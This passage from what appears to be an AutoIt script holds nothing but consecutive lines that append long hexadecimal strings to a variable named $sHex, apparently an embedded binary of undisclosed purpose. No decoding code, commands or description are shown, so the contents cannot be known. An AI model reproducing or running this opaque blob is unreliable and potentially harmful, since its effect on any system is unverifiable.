EC7BCDF34C830D8B4548C96AE4A94CF003E72D21244120110D4829F590E8CDC0E133FE0A0574048ABD81028588D9C4917F0C0CA184B80575566A240D34B95A9855F8527324021CE00904015F24BD38C0CE"
    $sHex &= "080314DE535174E1D6E06172015A4EC272749B78F820E652AE1B050FC3C1509AB9D3E157585121142216237DA7159909C8512CDE23331671FAD77A0F12D1C98B80E007E0BD00211988BF240EB51CF275282CF16900EC04639F30C65DAEE01C9D1C1428F5824C3A71DA131C749A4BF33514201824C4084C3382641F735008142949ACE5D35781A40AA10E9C50FDA4B41BD78CBF18CF52F070707229A52C0A70FC4D78C161EB269E28362A61BE5187B8A19F8E42432C4508E098E0089B2975C1207811DF54E908EF045B0834DF2F0B042308158DEB4BFA57144A09F7B88D036A3F18D19B55F940882F20E7C800DB515A91893AE01807189AE313F8BD6EA9526A786F1CA30FBE8CB8444A20EB5D1B048D200AE9D1734B23C51C0416D2F780EB0F1B015FD00A59901C5C4B0E38C66A1FFFB86117B0B549DE8D6785BB063C7BE636102808A65D60C4591B5539BED71A714C90C6088BEBC1F6813ABF80C712F077312EE803B8CF7F09E4E107BA0100F7D28E3A58D8C8F523C2690302B1B43296D4071A134FC69068B017D0CA00B399F8D10882D10B2F67423958D1BA6DEA0440E9D4663592F4AB43353D7E7D968195F5FBD9695B3C1674703C0C23391481745F5E45C061AB85049000447D3C180B282A6E0484A0BB9808F0F77CE62E61B15ECEA72AB3EC66E27D7207DFDB493AA21B188C4D750C8E7AB5DDF9837135013F085F56FA154EDF937F3B0877A266AC02D62D4D571C9688E2382F8FEBBFC58AC95433271543FE0828062EBDEB53EB65B88631021FF871ED7938C0CAE112812AE4F89BB03226BD88C0BEF5AD162F7B481149ABBDBFBC8175483FEEA813E00D66400B18F12F0E3ADEB06633F603C113D60A1D648B581027B4DE0CA29D4CDC030548CA0A1476521B07DE1C6CC410CFA40DEDFF05E703A1CDCE0B34E803D1542DC0A12B10C15F2E1C0534284B2B56F83782F0F8107228088FBC6A108D4264C246571003A0652F7B823519DD64B611BE0A196C275DB08406594F6A6A04D54D625E471C026363C60405F46986BDC96334E44DE48CC9A493423E2DA640692917042C4D20EDCBCFF90855D852246A08C8D89028F1185CBFBA02E6A079209F6E4D904A47BD849FB9F019AE1C1EA2E169BFE015D14B47094CC80285C441D15914443C49162A70351025BE1E022BC2CE383A5A9F0F47C2BF782D38EB201EC3EE776A2F14520A9087109E5D8509A188F709F9E6EB13BCEF00FA2F80F329E26AE831E4D148DF00082222948B7F14DF109A02E9F8D60C7CB00189A1634DFE06CDC1C81827AE24F80815BB132330711C4992385FD42CDCFC52204D87278911211F63E04909017F82DC4B880C2B84CDFF751F18232712D533B20637789BE536B80A07485AFA6426BC68B120BB42A4C9C750F0960146"
    $sHex &= "A140B82619CC1FC69180054986069D19864716EB11A9FCBA010EAD6ADF1E43C7C690E36D91A80D161B57E320FD6303194AC8F47D116A64EB71470A834EE2CA64CBE090A76CE0F64C53DF80F881C76BA1F5CC25F20616C4EC5E7139F0780F76E116F4C84610B920C7CC4D011058C779D0641DB1804F8DA5C938A401C5DF992170F043C01FA7B6D3A317B003A461F81D56D61A374CF00A791B62E34155013D634B5334811FFC8CFF08DCD5B800B14CAD133D585DC2E97F211F9189602A1FFC17FCCD159CE074D1E01BD1E21FF8F872C904233917F8FC02965C3274F843C3D32A3F3F1F6862016F030EFB58AE861789213E20243FBB49F0744D08510B8647EA5976522376E4686BFFF774D1E1FB804CB1033AF374EC48200B019D2001BCB9B2962A112CC785E086F78A017414388D13B90AEB566B5CB8BDF01C387A2FF785C1540D5D0A6DD9CFD6C2628B5219446369C1605F2BC43419664758DF3846D29BB85238430C521D08BBBBB5F04E61F5C38910FCE9D54B0F10553EFCB8E38AFAACB9FC0FA87B0B3D1F10236F11B7E4015DCC08C5306246DD4BFCEB3320010190DE7B775D0C2155752974A565437B7F2D750276FF0F2F6A0ED0ED250333F0C1048A176EF048C833C19EB0EDC0A810A3084510B14B01661F0D2AA04E9E10040275F062E3D95FC1F806826BC00903BAB0350C8317E00F5F34829C4072E4A311B0392414EA109B012135861A6B080302B7F044CC8548733F09380656E5066966FF6A01C1E2100BC217020803CDD21ACE107A1FBD86013E2A1AB107FB2DBD254CEABC640B6B283471A752D60962A8750A3FA623F4294BBDCE75F4D3B811A21423B086FB065E20ECB577A6DB30BE8F4201255F2FBE5090F5777F874E074B38F0610210B3BE14692279ADA494020D966FA1055D0E090BF1E720300F3A257FC01F5C9AEF11FBF4C5F4F4F42E697281037A822D707C754D1974E00E8437109891F40B8B32C493A1826167F49104D6703A6963AE4B48BB52D880E10E0F0286FC6380E0B35ED93F8DF8AAB016AC4A12620C252CD2267FFC33F60BC10BF205D4E51A3EF77D597DF8A9F46EC830C8F4F46BA94A4386074B4907E71B91344DC10845E845B95CC37206B1FCFC9861A13567B157E10D96A119F010FD1E1C43EDF56C07CF4DFCE4A2990DADEA0BFD072ED730ECFC95FCEFF4F4374C214C81F4EF4B422E9761FFF0FCFCAE82A3640408FD0F3CB8E148F4CDF42708D509D7B0CDE0E4A15B576E219D927F5B1E159CCBE903F819095EC2816930DF24D9124C41F3A00C00F41037AD2130A427E0A6DCE0746CD11A3208AA330881E6AE195F08630C103E3828D332071D007C2E08878FF8A17F8B0D9BBFE4B62D8C3888028707EBC3B809B6001F0005EDE0497DB415E0AFFC884415E879"
    $sHex &= "8D2AA1ED60C80B6075C44EE88B60052284880A6D7C40535137E470E4CA8C34A8E45DC2E443C29F1DEE03583A8A540DE8D98467A338D7937E121297CF42025FF8FC6E6EA422A1BE2D7512EC506C863BF9EB14391EB62D352BEE2B2730750B628C4BD353EADDC55082B79E0B7D3C743200DC697C08EABAEC782B1801425C92097F25725200FC48961393C88BF24D025E5FE29903C813F250B2EBF0963EA4B5347E21BE6FA3131C99D8C8661BC2AC84031D20EF18AD84D36504E41926C24B1C1A2A7480F7D9F83872BF7ED200F7DA9B2DAD26AC4BC6D5FDFF1A7800E36AC4B05C111F249CBF07A198C00A28D888BA770D9351128A38D240A989E35F50860D3BE8E4E9EF71BD2F452E47DA1AD4FC01D0B7F5F40D8DB5730043A8B044280296EC4499B5E1349783F80499D65D3DB1C83914250F1B5B3C2B27307514F6800B885FE173D8682802969124517EF429BE0F3F840C7F487C94F0CB16733D3D15674B9EF4F0B3E83049F6AE00CDF0F439ECD7C49A4B4B809D3DC488E11D5F9AEF3A77EC5DECD4D4EBD10B1E3E04612E0F859B1B694986E0688D5A5351820F379646F6425053054BD72206D4069470151C0D2B14B1DA1B521743536543B14575102FB2B56A532755FC8B6DB13DF535543954295CC56061F10475C8C8FED2D06BC90ACF26D0FB05A5A9ECD0C71C0FAFB2EBC6B62AF4D478D079C967FF5236600A854FF0BA75279806009D437D96EC0C001C002F40C0F62D1660D9EE0CDD45045DD861680C3D88F3B8193EB95CD32A9733CC2832D022EC01D5C30321D0D7980FA4122C31AFD6BEA0C5F1EBC4EB4761E4B879D1DAD634BC52B80B0A75914C1C235E3C38B9631596F7D82A000A5AD5D17CD934B0B6B4682D88F70044B009B436B08070D78847B468B5602F007C4DFEC8811CDFE77D94C67E6310567D5AEA99B92838178934FF7417F0C82C1D5700FDC802D03BFC3B3474DA097D17DF6DF0DC75C8304A8374DF73D8DC35D816EB152D4D0D8C92DF205DB31600F3E11C1BF639D00F169337B934ECE30BD4097D03DC7914060E6AEADD19E100D07CB82B5E5F5861185919FB051E131FCB5B035735B846532D625706603589FEC53DEA1B8D70F536FDFCC9C68EA20717570B8BB66A4F01492E7548B731C977DB2D92DB92DF01D30227A75FD789D64C32055B6453B12B2D827D20903833F3AAAD5CBA01CD9F3D34D5D0FFF85110002780479B1078E9FA382C403C0A3294FCCAA529346218F8815A93B5C03BD0243725D3D1C3B5B4061088536C88951F812BD0821183F199FF3FC55D58B7880432E2712ECDD3601F4D118AC1965A3375AFCB6B38C5549A632BC11FBB659C8010A01F0ED69CD2F736EFFB066B35B41087F03A2255654BE9F53E771D2ED9F754630BAC7FF740EB12EB10EB0EF0"
    $sHex &= "5DEB85688286093BF4AF3344E5E103C0BE61F918723BECDD08D33BCA7535214801231F851058F0F48A188808FB43DC6C8D99B21DEB192F4489748AFF8A02A8A5B1FEDE51EB8929F4C6026CE779DE3BE7F69506939997BAA990EF9F0004000104020903B4D4AA065F51084DC110BC208BE10B73EBD5C2B5EC142B4EF63FFF0CC06D0C1C88B7F14A6BBDF00AE845E8DAE9DC979322E2447B3EE4E4E44820110A9F59736271F7FE3B3362A3B134E2B55C0F8D5A8D44279419DF0EEC902D7F299629817D2CD06D2A84D87C6311E00A528E2347EF1E51A122DBF1A1E449E929C4C4B563B529F0C0DB31349296323F640A03D76EF78DCAF4C0244240C1E01EC8E8C1F7634CA586F83708F99C6960900A52638C1652108A6962EC6062B62668282FEC170B378A697BACA3935870009F0EA9B7D17F0BAB0C7F3152B5C2FAD0F8465C46F637CB733E23A743DDEC3B3DC0867C1D2B25193D372D30D65D0B437E49EB425CD609C0FFB5B42E1D6AE75E6C073C3EB76C8EA946583D67AD34B1D11F15062F83E0BC2346833FFFFC89CF8C804EEA1AAA1E0970F7F6ACC581FA0EF15EFE3DFEFF8AB489B806DFFD105707321693BF0E0D6B1247ACF89F684A25E05E1080886831D7A33D1B6D3F34493F7609770B7F04571A3B88255AF59770B516E79D10A1497B49A6146F19016C06EE7AD31A3FC640187D31D6D461FF8BA6D26FDA931D0E89F9107C04B030B9FAD00631DD00581C4CDB39898F95AE635BB5765FF8DD02DC65F0D753188AFF26BF8400C964205C5502FF253AC10FCDCD88307217D73B82615005F503733F9FD948439F7074D5706A2884253B116F1198BE83950ABF9E44FC7CEB40B00A3D7F3060528CD2711F055F6F8227C75F8C6A0111942B1EC013A0284A40DB895121B590103775716439511006F26A1CFF05FC166A10E89FA4EBDCC7984AC8B9056B5FDF51C5C2DA18BABFCA390F41A660AB48C1C0044482132FB8A418ADED4F21EBEDD51F68C436849F3F6D4B862A1F087F8E1EC48A9FD10D8B0B6E6339901F0D02CEB10F4F8C1129B60CB49F883F4FE8319284DF44370B1991694D800942EC496004EF463F3308DD085F8F7C603F30A44EE37C99DF8E23E912C4C91F7C42A810738FFC6A95E46CC12181D48E22DF514BC1AA4418E7BF6ED5EE4EF30810E40610403F572331C8E0E01FA358EC9270310983CF4EE2237F02EB5F2C108C0E23F0ED2621EB47C18C56F524163C4175AEA4A0EEB1D70C644D247D694864D0FC0AA52761A1920D8B4184C1B6BF7303BFC8A8CF7D656A0252E95A5672FEBC50F8FE634189B78B0DF748AA5C708570E8F7237B1BE551524A8C7100234AFB54BB3002CED5902C8446EB08CB9FA125706C48218748B6725A63AA7B0D5CE2FE65FFD2980A2CA4DE489D78FB"
    $sHex &= "4240D402466CFDE425F08005808593876D9936455F0C873C4B05912E21DFDFF6808FD2E2FFD19B7F36B94AAE3430BF40AE90212C280A105B18142292CAB414455B24106B48CC567FA76480E09420521F1C8927A42651A181E13FAA323515B8E918148EB66DAB9D7F7D710260A3A0D2D234145F470BB60DE740033F87DEAAE08A117B04DF56384AA6361A379F305DD24DC4BF0817D4D33D20EB184F1A16C846FF0002BF8287F310FA28C3DF39584AAE243F20928BE4221C180C144C2E147F102B19AA98BF0C400019685F08AECD4DEC7F9D1D5F040DC24950CABF317155221FC60C55A8EC093F29002B1F51A42B6A7F8828A89B0135E0100106FB2D84036CB1422A7E238708535AEEC4D007F90151FF4797135BF47981C2002E930231848A52B61EFCEDCD6A92E650C3F8DB04DC3CD60A03947818B27810A38DA14FBD3A04554693506C020A44E83D35861BB52B4A2EE8D2DC30A2A2F4EC347AF47EA5C9E50800CE69C0AD8E6DE2FC20626400AB3D8D6D305A2B55D666E00E48313A8BF89546A1991DC6212C546004EC46C6A36311AE0E7DBCAC91860251DC0DA7F54B0D1CA8DC89510C4B1B0F1E3A7E0E3CF2194661F0DE121E3D81EA6B12558663E383C5D88DCC0716CCC428013F44A9F0B1E2BC8C77B7523CD87865E0011C03E223E355542A797F565794883C99432A08C8F622F4303E1F13E8D32E81DD52638E15100BF53976A80F53BF2A95C07741FC027FC4E8E84E43A5A5130CE897ECB96848C53DA12B4DEC36EC4383F93D82F84C056C12FBF091CFED13F92C51AB041027061A4387F44061E422B45821AE359D286730705806086DF2693C0978DB29F687FCC8B85DDF14AE80EE36EF1869D2D4162C6C1224998BE8FABF5F760F1040209B782003F013FAA203318BBAA8213613D7DC8C0488427D048F2BAE36A95D673DE51CA08999A3312B53E4068F2C1BC20F3189416681A648A77529665F5C5DC62A79BF8DE533F0693AE474C1042447D2360442FC22ECFC71244772E0F0F4E711F87A990960ECACEA6171011F20328580135874E86546868BF4F407958D4410D0DBF1F63643A7BEBAE47C194A3BF414B3C6C07F11770D5B395AB122A132ECDE70294CFA408908E7CF2EB96CB859CC02032EB052A5ED9FAD0A8F16C41FC879AE110F22BF0C85A290BCF6D7F590F595193B27B87E142B5B93BED9458939B83F33DBCBAE74032379AD921485EFDD262F148D2B8D9339EE56B57092BF3E30B5F03B371F7C120A037D0CF702E24A7A431CFDFFE1C86AE00762AD60F53CE533F00DAF1307A374BEADDEF7DD22B66B5887F8BA538B6B0F4AFBBFC295699DE22CBAB4323550741408E2F9066B9EFA295504D67009B876F83D75E59E1E1048859FC1519B726131932C29B529D4AEDEFFC2FFCF8B"
    $sHex &= "F181C050182352518F501007DDDFF0C44D44C4008CA1246E033C08D74B997A8D584D9C8C812352C0A0601F1A2F94B2E4C400AD88C8B60AEE315582CC16379FB6A5692B6C10C4B681C88D36055B9F51A1935AD2495CC01D024CB03957C043445072C516849FEF9FAC00C92513B0AC24974CC8B4B8B45C322103A4A8A4C9840C90A09C13324072A09894C516C925989D391C8D88ED266B080119CDC9DBA91001140C23BA2303A15745000B8E08873280D339A250556AFB1F2DCB6D336CA0F310A401BDA8C48712455F7F2002EEDC8391AC6294C00EC07DAA0C731CB03D516C1A4D781EDB1882E4143CED3CED6620300D772A151FB0946E45AB0B0FAFD4D62F801156E0F43B4DF04163851F2CF02B74DDA469758DF51DF4EB1116A114AA52F92570B270377F0C7A0A60012CEEEA224A3332523310185C288400EFEB09371AE464EDAB9F18981CC80CF4CB784FC03E3DA218B06B8FC2029DAB450A84F8ECD9A1B64B1022BE00B4A4F7FC53AEDD041F60142B2B034033025881B395EE6ACF233086B0107F0EAC80E3225D20071E1B6BE91A9A3EE909E743C05F570F877A01BAF07D466BE70114480C2C7CFF9213F4DE7F88E51001570183FA2A7409280208722544DC025017081D1A22192A57296CDED46442F82F8BD46BAB092D3BD82237AD0D4B1BD9732DD9246F168EC716EB0A7488200CC1E0DD753E6F81E010FA706DC7C1856D6BB5615D9C21910C48C14C5DE0D6452C82110B96401E0A353B4DF897C44121A40D464803A81044015F0135E21A188BA99A11B7C74602B189FD431555F1115F31A8F8B1D3D35CDCAEA8B08DA056E4C22EFC06751D6A0652FB5C21F812D02AB5BA04EB047EE1BC212FE15607AAFB64F2BC6F4B5706EB4A44040400B775A16C5345055752799E3AE209097405A4F2BC23EB50DC030380D5AEE0AE07962384DD157578DB03970B6E7F7410CFE2FF9725B6FEC5B71F05BE8A8CD0827668884DFE4121713C18E210E669796F7B02D701112E0612420EA4063776DD38EF2526FFCE060401DA97AE8D2401190102060335EDBD89F60406010571B6FA061376B07F9E9526E10003010301021D2A02A9253F7FC34FFA09027D0AB81A4315A63ACBC6988497610516C208CE1A4AFFBA007F26D96BD20333C233AA99B97F9C105E0F99CA5DA7B1C0E173704E62CAC07411BF5D73F0814375017D648AA17470EC32557A772BEB59B7144D2EF03407C17C03C771501B0C6980E0A0424C3ED8A751AE14302EBFDB97E8C7D5021F4E0AF8407BC08F2B0B57DC29374D542AA93259D314BA00BE291D1B68C2AA16F091B18270A20B7F75096C46F8702E7816FD898B37E31D2900AC18579EBC554B0613C763D2DEBA0DF51E1C47EA8230E931082940AE9940FD21086B2FF69DDC59EB1F41"
    $sHex &= "B212AC4241218472EA6A3F188D79D9B8F15C3D9CDD04186005FAB47580FF04E117D2553B48407471105A588DD92C0E4ED6A9D0AD111F745867F0F93653755E4A18753FF14CAD80E37852329DA1536B7526210887709042F78A3C91295C0FA9F03D208C8026B9F63A9A4FE8E80DAD5BABA73F3C560ACE813A017832189922F3E28820CFF889997A6CB0B43F2EDF3F326E1D0A686EFBCD74C7F7E308A5013553A502484F7379359A323CEF2F40227A3E3546B001EB20C530A6DCEB1C3BD405AA649B8C66EB027A9DB1E8A731BF8017412E5A238941EC3990C8C074092FCB078185811B1CD4F57E46FF80807D80740F84D31298740B0A9A43CAA42D6B1AFD6128F5B0868D0CC402D41852432D7E7778753174952DDC9509DCB64D856DDC6002392E7D1726E2169D0D69DCE14C0A2049A615A1E21842D543222E5D1BEA440A142C1F18E05EE04172AF43221922A22948F0FB4D1CE06104465263CB56D6618535CDD6E84A1794006A695EBAC6531DA8161FE0ADB882E6B21A55D457B4BCCA07F4741E8DD816B4744FC04F4618AC55CDAF0C13D13480E440843E9C88231AFFC8E41710DE69041D79AFA17EDAEDE80CECF0EB25AB18491278416DFC44022DE8DDD5045A39E4DBEC17028E017C180BCA302DE008F83740C518C87EFD3DA36C23B0259DAAF4745EB050D411BD4C03669A47D5108404EBACA61B129FAC84CF8C2A8446AA2878A8883E89537084DAF814AC784A2BF8168851D3D550CA611D3E10CD5594D2D49711D618832DD50D619FFA7DB03CF8A827BBFCE708BFA88BAE37B305DC05EB580C0888C5B0DFBD1187C16B7C18F7327FE2C5C44BD90150EB40EB3E1898B61446E4930916C299321F8C3B2B51DF02D23B57906E11E12DFF63405DE82EB0FE6631489D900623B7D1074A095007F436BB07CD2E972296A9D330001E7C0E8D28AC11C026DD982A212C903F350D8EB634252CF31C2B38E490712104D76A624144DF69EA1D080E0E41EB6A97C26A6155FFE10F034FAE74077D414E6C2EB70A07091A75B59B4B5EE14E64724E4C0B8A80D0017C782A74F6B0B0C1E47840A4BF7413590830294508DE48919FDDDF0CEB112525FFFFBFFFB00D17896DB17FEE6CE0504B4BEB21620D47C35B17196FD42232529D3F66FEE9EF50108A4801884DE20E8A028845FB0E33A0F9B6511055EF3303E3358DDCD21B16FE97FA3CC375ABB26B46FB03E4F20536D5AD2DD74DFB39F218F80115856DC0673FA24D5B60E255E2B47526104545E60C54351B3E0C355BD07DB811E72251EBB5D77500DE7B125D23081F60A63A7496DA759CDA2238228B377D92302B6F7BC8EF728B251235F029571B96654FFB05581DFCF210385103E2F304A0C081FAAF07C2DC591F2D81E21B266BD4C4FBB149EBE1EB9F4105"
    $sHex &= "5CF234BCF9700C0CF020C3D3D3F0CA29C0483B83D1F667BC977D0DA1807BE205F24EF9C0310EB720272AA21F1AC407B0022633DA8564C3DA6A742B6C99F9FB976745884DF0EBC7EB23751D8B55AFD9C7A655158D497C75EBDD4512D27044711314A7E121C141740A1768846E5B63093F6329E2AD90A1B1205D2057D8B139663A01BCDC8C28B633FC83C14F0C9F109277C75E751A6E153D02BD113FE49079825D348A5DCFDCB922758D538B5F9B0B3CD212812D754E78B65D7405F670A44379263934787E5AFC68B5338F53DC7C0F90E0056195707FE3D9EB15B018412BEFF013708B07ABB9CE8FDA21228BC809ADA0BC18070011A6C771844C3194C4C30FFBBD5AF8E38ED5FFEB2CBF22878F1D87F4EBE8E87DEBDE986048F083F0592945DFAE1925EE1E2CDF0A1815D6063F93E306D0C781BF1C033A918E33B77C18953801F75D165318408C4B9A804C7786BE91236601DF0CF01A9DA92C472C3A04911D78A0BEED5BCF8A85490BB4C0FF8035A6903343D19710E76408238B2C4966AAC20CC2EDC9424A62753F6361118689F150390B0C5C042B041731752E091F0341EC014A81814B4BEA04F3B6E810F536E648C0956D2EE39DC176B5393975188B2D412BC467610FB2DB930C35001F000403706F32B1BD4C461D101EB8109FCB65066490860108AC491C4B18482BEDB0260821F10DB0B6F674272095F1FF0C802382B3128B065EEA132DE0D426DD38D46C4CBB4A400EE5D0ED2010FB4D4D5C1466A40D101D035F833D103BD1431DD20806FB513BC233F56B298230D88F47964ECB18C53347140603039B0329B98DCC4600ADFCC0A0682ACD184218DC6EA6EE196970FC1C3BC8BE45BC0AA381E2A98A6E1406B31D0EEB70609756AD6BEB55442FE534DB87483134490E41323F6F9D7023BD7A75362D5D60E140C06BD1C52D85DA6D63414A0B0C6ECC4C01971666C1330557CF26610115D322C6D60C14148FF95DB980C09FC4C7853CE0774338E69B7008B90C1B74FF5FF87DA0F3A5C645D0458D8D703A808D954526DCBB401155DCC68523ECA0B5C681EE898578120BC4D9FCB45B168D7C2040404E8D5595483DEA91C27FCF045C67A7644CA8E55142005BE553FC08AEDCB8E4A084B44D404FCD1AE3CED080E719284B0549AC189EEFE89B6B8D4DD0F732812C8B1C42D80E9159512894F02415FF944EC7D2B4FCE1C0E0467822877F0F751F31804324D77C14F3127E2BDE2039E07D0646C6000E508410DEDE9FC2E00BC2259BAC1030A71195B11CAB9B7A1E5B00C35FB0E54208C42B4D0CDDD4D420473328DD18681FAD9E547EF9B51A1A304ABF5042B8F8088D5401EEF4798C4B2D4335D140DB12BBCA7C223BF47FFF900D1AC9B312C4B40714EA0E3A37BC3F1E9A860A7537C43F010FAA05EB"
    $sHex &= "C0DFA5C7B15380B915311B676A28AB2A18CFD56CE122F4E2810C0A9CF58115CF74389DA2EB58935807AFBBEBEDFB3F402F5BE9E4E7080129EC280C2F860E24165E9366C9A6270CECF201A1EA181900EC81CBA0CB3A83CA47242402BB812B79EDE84173A5AE0A017FFC41E0E99EB6B4500CF43068F0F09C14426C8BDF36A74143516BB55C25FFC005E1A616890D438029A722D51903C2E9D884C770FC18F14DA45B111F4838A49021192E4D31691E89146F6D8701B563EBCF9D9F02C59909F3B652580D2154E1BE4DFFF4264A4D218402C21E48FF7D2B3E218409E97C06B06316EB04389BF7D2B062784AFF750E1C06CE0B772AA2C12D60E7675D03C17F0142FD35106B1A752A82523084044E9F0B38532391E61E2824146637E54C08044A840D10F31264B8A2432565081F30402A253EB688702094EBB75CE5B60A209C2D8863410184D0A61083E1BE09A4327A145C77180572B9403E28AC5A20DF203B2C456888D4249F530E14C0D249AB88D949D80EAC315704844AAD91DF306F350F73397B01BDB8201620BD8701B65D05BD14CB1C3ABEA04BE2237D9E0C6B6B0D353E64EBB40203DD40F14020917EC016AC6D411D3901D3392E2914826BC189804DC22D0525543E11ED0CF48D06D02D83F47D60BD5A4CD611F10AAF480CAD7030B082832BA4B65E53EE0350BA02230B4F1E7F3A6A03976AEE1EF87615E3164AAD3039646127809F31BA85D47F2FB88736ADDBF80F8D062E26BA55533FECAF63659A309084CAC4680616FC33CEAC29C8BA2F64C45838447E7E39532B1909EF8C28AD06C0ACCCE108D058584C9F815178136130294D4E507C01452F22DF285634F8AD0301D8B6D80B0F877C02E7D860086C20ED32B87EFDD6D7348E101C8432ADD199695B114606C3BA043F0922EF030B48AFD69960FF0C7D4A010BC1610267109321102A800C21B3C17902036DC821CFB618109115C1107203046D45FD3EA49F1F420236C924C3E90304051008A816464371F4173F1FC0B69372F0F4894A58854C049F063964A4293CE0E4040534954B2E0607ECE0D39B1CD2E4EC937A175279F006751C49E0E4EB3F5A0BAD3AF04DE05683C2084D49B4241CEC6A041C990ED2AD2478F7E0F910F50DE17B1676411CF3C244A2B74DEA74D0A581DC151189414C504F1A7780950CD1E93C71AE230143CE560580AF3567184EC74003CD32CED6B8A4BAE1744FC102103B0CB9101B55631CF00528DC4CB5F33CDB22942FF10630022758224736CF95DE31653243B43098EE4E063F0CE14861075EDCFCA54CC3450756C5FC000F86C606C3EE277517403937140696B8990E7E969606085D9AFC07180AA9CF00A32A703EA5EC46E9D22CA2DE383012E2E21F064E32ED7A10114A8BA81DBD1B0FBE043C71DA72000C72"
    $sHex &= "B759E8846AC51875186EC14A0BAF1724686860212E1C2533376AA4067EB5F803A99C2C3B45D2760631F82B9202301F9C29FE0803A1008755B1B95F08F8BE560D86D3E0F2D6F81717702355FC75344B700B4DFC00D112AE701D2E3EFA2704538841350881C2D212E89E8ACDC9AA07AEB5E0BFB10516938537C1520C5F0A8CF38A1DC35C256E03E977DF2A40DC5808A57A493384373F53A37A04807C377FEA34DF0F5300762D37F8F80337EF0F367F1B7C36F8FF7311788C704AC583CAA6FD4300214E3F9A00948302BFCC0A782A8DA3E0F070655C1B4028858B844788FF92C904A61BC4047C5D2968D1E0D66F107C2161F0771770C1ADD3535D6A93811512CF7F812C221E11529ECFDC21A4E42D3FD00C5A68D02A5F74157879017C7BB90836BBCE8B1A001D17CBC6BC003FA237BB10655518B2058C6769161631D419B8565C8114FF7F8BBBA1180D18B05E328A4D10887DB781CB4840FC3318837A65B8E764396E481D53FDEC619FDA101DC642943623D4CEAE5618000C1CE928C16C5DCCDF07E4B00E5B635B2E7F0318E84083EA406D68933595787F6F8811A4F85811CC02C420BBA1E5B119CCEB3731A0435C0C5916019E890188825744E4DA2510F037DB274144E07CDFD50D0F2338FF9C0E28C30ABF9DEF151B46B15FCF5B8ABC0A8D3FCFAC7490E0E615CF5981400BADAB014D4413F87097803C0B48E3488247240624CA83E1183E3C0DDCC16448E3A10A6095043F47EEAD73E92E67DD0C850C7714F0AC2E813FEDDEFB54B4A8246F1FAA8C54E25138058C0A45A63636E63F7C3F71A1C32286E5BC0A015EDE705D3F6C23CE4C946AA4084D85D894989FA3FEB937A701034740559483C230C96C4759984728B06B5E2160482DBF39C16D492B043EA422755EC8CFDB5D43D828676A018ECD149504335572C84E314B7717EBC45D5BBC4C10F458DB8B2450C3FA5807A165D9432B28AE52F3CB32FE61326E4D1FC62F8403D12F0B850F136BBF84FD1460142A2EE4841A8841F800F0698C31681A907B152914F917FC3B78103E8E6E7D7E7C539110360304067887268650795A8C8C7D8CE0D1FE7EFC7431128D54CD9030804FE8078093DEF380F3D1B55A6D80F367CACC761F0B7718EBB7908A44D5947418D20C3CDC88897AC03AA48CBF19C8AE8CD83229E47D8C0D7D49BADBDAFA20E2235584D4E44CC5F46274AD900FD2B088509E5978BDDD9523CE35B4D98EB7DC59F7A8E214201003A811FF7496C702335F9CC9973B98DF5643B2CC0CD86B817514650A3ABAD08D53848884E3644A856F10775B2DDF0FAEBE402FE0053AF7F63F81090208851C5E9FC0426208977411BCB5026A0916256C605BD717511F613216EC4B2C1F6A0A6588BED8AAE1DF176A0590B0B535397F61DBDFB69A910884"
    $sHex &= "65DB7BB402093FC73C4210C4CAC26AD6B1A62EE241FA44F3B1F23003C33DD818E87CCE184BA1BB370B42411D8D315E95D2035F009D662AE152EDB32B2A81068BBD5281143D0C45F89E2721D1523902DE457099436E2AC014504DFEBE89213CEB21970271040A4B194BB2B3865CB0DBDF083376F961E118A0E83C5083BE0703B7257517F9082413C1BA11D7F8A4B54432F83D570AB3ECE0BDFAED99715149662B149F582A0D08DFF4D016380B8C313001815BC4860F241808ED3C4809E04C07AB24022890064F08D59562F452DF309D14B002999F572A8C8034C524BFA08472C119D75F83810F18566D74991B0CEC0A540838B9EF05E199A87DBDF00FAF75AFD4BC09A1FBEC036403B2E0805A5A73C6BF3438AD3447A80B5C03E7689A5F08AA171A0E6F1AC30A45D17442653C0490691E6CBA85DF8D0C9521E20A3C8371D8425EC36673691FD85C551CC1169F2D75140224C778246150209C20B8F6C319F750513D7C4D01DF38D89F0CB3A19194229382B986C09E282E307510516B0A1E953C050FF3805BEAD20A74759FCACC676A519CC81EBBD2EE8DF3D712DA8702BC02054614BB9FCB15703649A400D6EC3A0DAC431FA528AD54E0ACAD5907135390A3210AA18435641D2DD890CEEE4AECECEB5BE78180D829B44CFE0F4C1CB7AAFC2C6115607C0F7F762907B0CA450B1E1A684C2776EDFC22C1FC5AE5FCFFE0080D242D15DF8227A61F031B6C7C1B7A0702277C20730A9B01FBDD2D7C0002C781791270760A780478575D175F1856A42216E945524A321AF8224BEF4D808D02D67D0F1D0E458F2E49A4AE39E897B134A46349048091566560F6EBC95642E1830974E7206C049E00567464EB67D03D6FF47C260433761C0C5AC32E7BDB0BA8D765E0EB27E7525111391D1FEFC8C104DC8155D4B1676193C7AA11B097BFB104666A009F243EA1343D9F8E41AC38844104424C17115F3A3FDB883C81C0FC81C25AA10075086C7ADA04E875181FA91E11DD159F1D2F6AE04A28AAA1E08149528B286F7335ED9A1D8B3A109140C9658E25C75650B864DAC5484D537C2C9AE669B801F0244D4D1AA9435B886B63FD58644C5D9F0FCA7C0C87BB4525312E057537B1725C9B8A755CE71B8B08AC04D34EFA2281B901BC88550F3A148D283F39742B0AB2ABF025E93CC5099AD22062749C08AD854ECC15BF1456FC2D602342037D855118E18A6F071E8811251F39000B18E362D3000B635CB0B9D311185140A28D492E02DF905A9A216510BAB2315961CBBF451178BCA19049BA8EC09FABFBF442607D3AFDB69564BF3020034A5C32307A143B8C7D276C721EA61D10CB4A2CD72C1FB27F2C8D0CAC2DFCB5B19A0DAD6980BB8046B756301D229E8FED0820ACAE24CB0CD5E66D3630DE8F428935055AC7EB"
